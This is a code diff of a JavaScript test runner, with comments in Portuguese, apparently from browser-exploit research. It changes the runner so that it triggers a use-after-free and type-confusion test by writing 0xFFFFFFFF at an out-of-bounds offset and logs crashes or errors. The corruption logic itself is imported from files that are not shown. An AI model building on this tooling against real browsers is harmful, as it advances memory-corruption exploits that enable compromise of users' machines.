@@ -1,53 +1,60 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-import { diagnoseHeapCorruptionEffects } from './testJsonTypeConfusionUAFSpeculative.mjs'; // Nome da função importada atualizado
-import { OOB_CONFIG } from '../config.mjs';
+import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
+// OOB_CONFIG e KNOWN_STRUCTURE_IDS não são usados diretamente aqui, mas são usados por testJsonTypeConfusionUAFSpeculative.mjs
+import { OOB_CONFIG, KNOWN_STRUCTURE_IDS } from '../config.mjs'; 
 import { toHex } from '../utils.mjs';
 
-async function runHeapCorruptionAndObserveAllocations() {
-    const FNAME_RUNNER = "runHeapCorruptionAndObserveAllocations";
-    logS3(`==== INICIANDO Diagnóstico de Corrupção de Heap e Efeitos em Alocações Subsequentes ====`, 'test', FNAME_RUNNER);
+async function runUAFTC_DepthTest_WithValue_FFFF() {
+    const FNAME_RUNNER = "runUAFTC_DepthTest_WithValue_FFFF";
+    logS3(`==== INICIANDO Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) ====`, 'test', FNAME_RUNNER);
 
-    // Offset problemático conhecido
-    const criticalCorruptionOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
-
-    // Teste 1: Corromper com 0xFFFFFFFF
-    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0xFFFFFFFF ---`, 'subtest', FNAME_RUNNER);
-    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0xFFFFFFFF);
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-    // Teste 2: Corromper com 0x00000000 (para comparação)
-    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0x00000000 ---`, 'subtest', FNAME_RUNNER);
-    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0x00000000);
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    const valueForCorruption = 0xFFFFFFFF;
+    const testDescription = `DepthTest_OOB_Val_FFFF_Offset0x70`;
     
-    // Teste 3: Corromper com 0x41414141 (outro valor comum)
-    logS3(`\n--- Testando Corrupção em ${toHex(criticalCorruptionOffset)} com valor 0x41414141 ---`, 'subtest', FNAME_RUNNER);
-    await diagnoseHeapCorruptionEffects(criticalCorruptionOffset, 0x41414141);
+    logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
+    
+    let result = await executeUAFTypeConfusionTestWithValue(
+        testDescription,
+        valueForCorruption
+    );
 
-    logS3(`==== Diagnóstico de Corrupção de Heap e Efeitos em Alocações CONCLUÍDO ====`, 'test', FNAME_RUNNER);
+    if (result.potentiallyFroze) {
+        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
+    } else if (result.errorOccurred) {
+        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
+        if(result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "warn");
+    } else {
+        logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
+        logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
+    }
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
+
+    logS3(`==== Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_HeapCorruptionEffects';
+    const FNAME = 'runAllAdvancedTestsS3_UAFTC_DepthTest_FFFF';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Diagnóstico de Efeitos de Corrupção de Heap em Novas Alocações ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Diagnóstico Corrupção Heap";
+    logS3(`==== INICIANDO Script 3: Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - UAF/TC Depth Test (0xFFFFFFFF)";
     
-    await runHeapCorruptionAndObserveAllocations();
+    await runUAFTC_DepthTest_WithValue_FFFF();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico de Efeitos de Corrupção de Heap) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Teste UAF/TC com Profundidade Variável (0xFFFFFFFF)) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
+    // Ajuste final do título
     if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
         // Manter
     } else {
-        document.title = "Script 3 Concluído - Diagnóstico Corrupção Heap";
+        document.title = "Script 3 Concluído - UAF/TC Depth Test (0xFFFFFFFF)";
     }
 }
